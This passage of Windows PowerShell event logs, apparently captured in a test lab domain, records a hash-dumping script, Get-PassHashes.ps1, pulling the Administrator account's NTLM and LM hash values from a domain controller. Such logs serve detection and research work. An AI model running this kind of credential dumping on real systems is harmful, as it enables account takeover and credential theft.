</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator; id=500; lm=aad3b435b51404eeaad3b435b51404ee}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 112
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.579744100Z" />
    <EventRecordID>14237</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-743b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 112
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="ntlm"
ParameterBinding(Add-Member): name="Value"; value="31d6cfe0d16ae931b73c59d7e0c089c0"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator; id=500; lm=aad3b435b51404eeaad3b435b51404ee}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator; id=500}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 110
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.579535100Z" />
    <EventRecordID>14236</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-733b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 110
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="lm"
ParameterBinding(Add-Member): name="Value"; value="aad3b435b51404eeaad3b435b51404ee"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator; id=500}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="500"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator}"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 108
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.575303000Z" />
    <EventRecordID>14235</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-e03a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 108
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="id"
ParameterBinding(Add-Member): name="Value"; value="500"
ParameterBinding(Add-Member): name="InputObject"; value="@{Name=Administrator}"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="Administrator"
ParameterBinding(Add-Member): name="InputObject"; value=""


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 106
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.574991400Z" />
    <EventRecordID>14234</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0001-df3a-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Add-Member
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 106
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="Name"
ParameterBinding(Add-Member): name="Value"; value="Administrator"
ParameterBinding(Add-Member): name="InputObject"; value=""
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 104
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.568566000Z" />
    <EventRecordID>14233</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-723b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 104
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="psobject"
</Data>
  </EventData>
</Event>

